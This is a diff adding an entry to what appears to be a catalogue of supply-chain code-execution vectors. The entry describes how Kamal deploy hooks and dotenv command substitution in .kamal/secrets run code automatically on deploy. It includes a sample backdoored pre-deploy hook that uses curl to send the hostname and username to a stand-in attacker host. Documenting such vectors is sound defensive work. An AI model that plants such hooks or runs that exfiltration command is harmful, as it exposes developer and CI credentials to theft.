@@ -1,0 +1,67 @@
+name: Ruby Kamal Deploy
+id: kamal
+description: >
+  Kamal is a deployment tool built bfor deploying containerized
+  web apps, mainly focused on Rails.
+  It supports two distinct code-execution vectors embedded in the
+  project repository.
+
+  Hook scripts placed under `.kamal/hooks/` are executed directly by Kamal
+  on the deploying machine at specific points in the deploy lifecycle. The
+  `.kamal/secrets` file is parsed using ruby dotenv, which supports command
+  substitution — any `$()` expression is evaluated by the shell when secrets
+  are loaded.
+tags:
+  - ruby
+  - rails
+  - deployment
+  - code-execution
+  - config
+  - supply-chain
+
+exploitation: |
+  ### `.kamal/hooks/` — scripts executed during deploy
+
+  Kamal runs any executable file found in `.kamal/hooks/` at well-defined
+  points in the deploy pipeline. These scripts are shell scripts (or any
+  executable) committed to the repository and run automatically on the
+  machine performing the deploy — typically a developer's workstation or a
+  CI runner with full access to deploy credentials and SSH keys.
+
+  Available hooks:
+
+  - [docker-setup](https://kamal-deploy.org/docs/hooks/docker-setup)
+  - [pre-connect](https://kamal-deploy.org/docs/hooks/pre-connect)
+  - [pre-build](https://kamal-deploy.org/docs/hooks/pre-build)
+  - [pre-deploy](https://kamal-deploy.org/docs/hooks/pre-deploy)
+  - [post-deploy](https://kamal-deploy.org/docs/hooks/post-deploy)
+  - [pre-app-boot](https://kamal-deploy.org/docs/hooks/pre-app-boot)
+  - [post-app-boot](https://kamal-deploy.org/docs/hooks/post-app-boot)
+  - [pre-proxy-reboot](https://kamal-deploy.org/docs/hooks/pre-proxy-reboot)
+  - [post-proxy-reboot](https://kamal-deploy.org/docs/hooks/post-proxy-reboot)
+
+  A backdoored hook blends in with legitimate deployment automation and fires
+  automatically on every deploy without any additional action from the victim:
+
+  ```bash
+  #!/usr/bin/env sh
+  # .kamal/hooks/pre-deploy
+
+  curl -s "https://attacker.com/exfil?h=$(hostname)&u=$(whoami)"
+  ````
+
+  ### `.kamal/secrets` — dotenv command substitution
+
+  Kamal loads `.kamal/secrets` using dotenv to resolve secret values before
+  passing them to the container as environment variables. Because dotenv
+  supports command substitution, any `$()` expression in the file is executed
+  by the shell at load time — which happens on every `kamal deploy`, `kamal
+  redeploy`, and any other Kamal command that reads secrets.
+
+  For more info check [Ruby DotEnv](/#ruby-dotenv)
+
+references:
+  - url: https://kamal-deploy.org/docs/hooks/
+    description: Kamal hooks documentation
+  - url: https://kamal-deploy.org/docs/configuration/secrets/
+    description: Kamal secrets configuration documentation
